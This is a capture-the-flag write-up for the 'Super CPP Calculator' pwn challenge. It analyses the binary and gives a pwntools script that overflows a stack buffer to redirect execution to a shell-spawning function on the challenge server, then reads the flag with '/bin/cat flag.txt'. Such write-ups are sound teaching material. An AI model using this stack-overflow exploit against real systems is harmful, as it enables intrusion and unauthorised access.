https://ctftime.org/event/2353

# Super CPP Calculator (pwn)

Funny Pwn

## Analysis

- `main` @ `0x4018E6`
    - Sets up a `Calculator`
    - In a loop lets us call either:
        - `Calculator::setnumber_floater`
        - `Calculator::setnumber_integer`
        - `Calculator::Backdoor`

- `Calculator::Backdoor` @ `0x40184C`
    - Allows us to write `*((int*)this + 6)` bytes to the stack from `stdin`
        - This lets us control the return address if `*((int*)this + 6)` is >= `0x408`

- `Calculator::setnumber_floater` @ `0x4015CA`
    - Sets `*((int*)this + 6)` equal to `A / B` where `A` and `B` are `float`s and `A` cannot have more than 1 decimal place

- `_Z3winv` @ `0x401740`
    - Simply calls `system("/bin/sh")`

## Solution

1) Use `Calculator::setnumber_floater` to set `*((int*)this + 6)` equal to `10000`
    - We do this by dividing `1.2` with `0.00012`
        - `1.2` has only one decimal place to ensure that we jump over the code that changes its value
2) Use `Calculator::Backdoor` to set the return addrss to `_Z3winv`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./test", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b *0x0000000000401716")
p = remote("34.30.75.212", 32059)

p.sendlineafter(b">", b"1")
p.sendlineafter(b"> ", b"1.2")
p.sendlineafter(b"> ", b"0.00012")

p.sendlineafter(b"> ", b"1337")
p.readline()
payload = b""
payload += b"A" * 0x408
payload += p64(elf.sym["_Z3winv"] + 8)
p.sendlineafter(b"> ", payload)

p.sendline(b"/bin/cat flag.txt")

log.success(p.readline().decode()) # DEAD{so_ez_pwn_hehe}
```

## Flag
`DEAD{so_ez_pwn_hehe}`

smiley 2024/07/27
